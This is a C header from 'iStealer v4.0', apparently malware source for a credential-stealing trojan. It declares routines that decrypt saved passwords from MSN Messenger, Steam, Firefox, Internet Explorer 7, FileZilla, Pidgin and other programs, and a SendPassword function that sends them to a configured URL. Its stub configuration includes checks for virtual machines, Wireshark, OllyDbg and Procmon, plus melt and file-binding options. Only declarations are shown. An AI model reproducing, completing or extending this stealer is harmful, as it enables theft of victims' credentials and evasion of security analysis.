// main.h - iStealer v4.0 - Kizar Labs 2009
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include <windows.h>
#include <stdio.h>
#include <wininet.h>
#include <time.h>


// MSN Messenger
//
//////////////////////////////////////////////////////////////////////
typedef struct _CREDENTIALA{
	DWORD Flags;
	DWORD Type;
	LPSTR TargetName;
	LPSTR Comment;
	FILETIME LastWritten;
	DWORD CredentialBlobSize;
	LPBYTE CredentialBlob;
	DWORD Persist;
	DWORD AttributeCount;
	DWORD Attributes;
	LPSTR TargetAlias;
	LPSTR UserName;
} *PCREDENTIAL;
typedef struct _DATA_BLOBA{
	DWORD cbData;
	DWORD pbData;
} DATA_BLOB;

typedef BOOL (WINAPI *typeCredEnumerate)(LPCTSTR, DWORD, DWORD *, PCREDENTIAL **);
typedef VOID (WINAPI *typeCredFree)(PVOID);
typedef BOOL (WINAPI *typeCryptUnprotectData)(DATA_BLOB *pDataIn, LPWSTR *ppszDataDescr, DATA_BLOB *pOptionalEntropy, PVOID pvReserved, DWORD *pPromptStruct, DWORD dwFlags, DATA_BLOB *pDataOut);

// Steam
//
//////////////////////////////////////////////////////////////////////
typedef INT (CDECL *typeSteamDecryptDataForThisMachine)(LPSTR, INT, LPSTR, INT, LPDWORD);

// Firefox
//
//////////////////////////////////////////////////////////////////////
typedef enum _SECItemType{
    siBuffer = 0,
    siClearDataBuffer = 1,
    siCipherDataBuffer = 2,
    siDERCertBuffer = 3,
    siEncodedCertBuffer = 4,
    siDERNameBuffer = 5,
    siEncodedNameBuffer = 6,
    siAsciiNameString = 7,
    siAsciiString = 8,
    siDEROID = 9,
    siUnsignedInteger = 10,
    siUTCTime = 11,
    siGeneralizedTime = 12
} SECItemType;
typedef struct _SECItem{
    SECItemType type;
    unsigned char *data;
    unsigned int len;
} SECItem;
typedef enum _SECStatus{
    SECWouldBlock = -2,
    SECFailure = -1,
    SECSuccess = 0
} SECStatus;

typedef SECStatus (CDECL *NSS_Init)(const char *configdir);
typedef DWORD *	(CDECL *PK11_GetInternalKeySlot)(void);
typedef SECStatus (CDECL *PK11_Authenticate)(DWORD *slot, int loadCerts, void *wincx);
typedef SECStatus (CDECL *PK11SDR_Decrypt)(SECItem *data, SECItem *result, void *cx);
typedef void (CDECL *PK11_FreeSlot)(DWORD *slot);
typedef SECStatus (CDECL *NSS_Shutdown)(void);
typedef char * (CDECL *PL_Base64Decode)(const char *src, unsigned int srclen, char *dest);

// Internet Explorer 7
//
//////////////////////////////////////////////////////////////////////
typedef unsigned long HCRYPTPROV;
typedef unsigned long HCRYPTKEY;
typedef unsigned long HCRYPTHASH;

typedef BOOL (WINAPI *typeCryptAcquireContext)(HCRYPTPROV *phProv, LPCTSTR pszContainer, LPCTSTR pszProvider, DWORD dwProvType, DWORD dwFlags);
typedef BOOL (WINAPI *typeCryptCreateHash)(HCRYPTPROV hProv, DWORD Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash);
typedef BOOL (WINAPI *typeCryptHashData)(HCRYPTHASH hHash, BYTE *pbData, DWORD dwDataLen, DWORD dwFlags);
typedef BOOL (WINAPI *typeCryptGetHashParam)(HCRYPTHASH hHash, DWORD dwParam, BYTE *pbData, DWORD *pdwDataLen, DWORD dwFlags);
typedef BOOL (WINAPI *typeCryptDestroyHash)(HCRYPTHASH hHash);
typedef BOOL (WINAPI *typeCryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);

// Prototipos
//
//////////////////////////////////////////////////////////////////////
typedef struct cData{
	char isVirtual;			// 1
	char isWireShark;		// 1
	char isOllyDbg;			// 1
	char isProcmon;			// 1
	char isMelt;			// 1

	char isMsnMessenger;	// 1
	char isGoogleTalk;		// 1
	char isTrillian;		// 1
	char isPidgin;			// 1
	char isPaltalk;			// 1
	char isSteam;			// 1
	char isNoIp;			// 1
	char isFirefox;			// 1
	char isInternetExplorer;// 1
	char isFileZilla;		// 1

	char cUrl[100];			// 100

	char isBind;			// 1
	char cBind[50];			// 50
};

int GetMSNMessenger();
int GetGoogleTalk();
int GetTrillian(char *programFiles);
int GetPidgin(int none, char *appData);
int GetPalTalk();
int GetSteam();
int GetNoIp();
int GetDynDNS(char *commonAppData);
int GetFirefox(char *appData);
int GetInternetExplorer7();
int GetFileZilla(char *appData);
int GetFlashFXP(char *commonAppData);
int SendPassword(char *application, char *url, char *login, char *pass);
int SHA1Hash(unsigned char *buffer, unsigned long bufferlen, unsigned char *hash);
int LoadApis(void);
int UnloadoadApis(void);
// Global vars
//
//////////////////////////////////////////////////////////////////////
HMODULE hAdvapi32, hCrypt32;

typeCredEnumerate CredEnumerate = NULL;
typeCredFree CredFree = NULL;
typeCryptAcquireContext CryptAcquireContext = NULL;
typeCryptCreateHash CryptCreateHash = NULL;
typeCryptHashData CryptHashData = NULL;
typeCryptGetHashParam CryptGetHashParam = NULL;
typeCryptDestroyHash CryptDestroyHash = NULL;
typeCryptReleaseContext CryptReleaseContext = NULL;
typeCryptUnprotectData CryptUnprotectData = NULL;

struct cData stubConf;

// Ideas for the next version
//
//////////////////////////////////////////////////////////////////////
/*
	AIM
	ICQ
	Opera, Safari, Chrome
	Miranda
*/